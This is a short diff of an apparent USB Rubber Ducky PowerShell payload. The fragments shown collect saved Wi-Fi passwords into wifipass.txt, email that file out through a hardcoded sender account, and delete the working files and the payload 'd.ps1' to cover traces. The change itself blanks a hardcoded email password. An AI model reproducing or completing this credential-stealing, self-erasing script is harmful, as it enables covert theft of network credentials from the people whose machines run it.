@@ -26,7 +26,7 @@ Out-File wifipass.txt -Append -InputObject $a
 # --------Email the output file---------
 # Allow less secure apps for the sender email (https://myaccount.google.com/lesssecureapps)
 $FROM = "samoran@life-christian.org"
-$PASS = "ASDFGHJKL;'"
+$PASS = ""
 $TO = "samoran@life-christian.org"
 
 $PC_NAME = "$env:computername"
@@ -46,4 +46,5 @@ rm wipass
 
 # remove ducky payload
 rm d.ps1
+
 
